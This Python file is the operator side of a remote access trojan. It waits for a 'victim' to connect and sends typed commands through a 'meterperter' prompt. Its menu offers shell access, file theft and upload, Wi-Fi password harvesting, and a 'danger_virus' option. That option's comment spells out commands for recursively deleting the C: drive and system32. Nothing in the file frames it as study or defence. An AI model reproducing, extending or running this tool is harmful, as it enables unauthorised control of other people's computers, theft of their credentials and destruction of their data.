
from socket import *
import os
import sys
from time import sleep
from colorama import Fore 
import platform
import random


names = ['hacked1','hacked2','hacked3','hacked4','hacked5','hacked6','hacked7','hacked8','hacked9','hacked10','hacked12']
namefiles = random.choice(names)

oss = platform.uname()

os.system('cls')

server = socket(AF_INET,SOCK_STREAM)
server.bind(("localhost",1542))
print(Fore.RED+"[+]"+Fore.WHITE+" Waiting for the victim to connect")
server.listen(1)

client,addr = server.accept()
addr_info = tuple(addr)

print(Fore.LIGHTBLUE_EX+"\n[!]"+Fore.YELLOW+" Client Connected (: ")

print(Fore.RED+f"\nIP : {addr_info[0]} "+Fore.BLUE+"|"+Fore.RED+f" PORT : {addr_info[1]} \n")

print(Fore.LIGHTRED_EX+"""
pwd : pwd 
---
access shell : get_shell (Steal CMD)
---
Upload file : upload_file + (with link)
---
Destroy all the system : danger_virus (Remove Windows and system32) #RD C:\ /S /Q del c:\windows\system32*. * /q del /f /s /q “C:*.
---
Download File : pickup + [name of file] (.txt files)
---
Change Directory : cd (cd + [dir name])
---
Rename File : ren_file_ + [file name] + [your name] (Change the name of the file)
---
Shutdown,Restart : shutdown,restart
---
open link : open_link + http://example.com (open any link in target system)
---
drives list : dir_ls (see the name of the drives)
---
system information : sys_info 
---
file list : ls (see all the file names that you are in drive)
---
Remove file : rm_file + [filename] (delete any files for ever)
---
Hack System Wlans : hackwifi (get name and password)
---
upload txt file : uptxt_ + [your text,dont use space] + [yourname]
---
send alert : s_alert_ + [title] + [message]
""")

# print(Fore.WHITE+client.recv(12345).decode())

while True:
    command = input(Fore.LIGHTRED_EX+" meterperter > ")
    if command == 'clear':
        os.system('cls')
    elif command == 'exit': 
        exit()
    else:
        client.send(command.encode())
    
    
        data = client.recv(99999).decode()

        if "Mr.404" in data:
                sfile = open(f'{namefiles}.txt','w').write(data)
        else:
            print(Fore.LIGHTGREEN_EX + data)




#    cd python/rat/module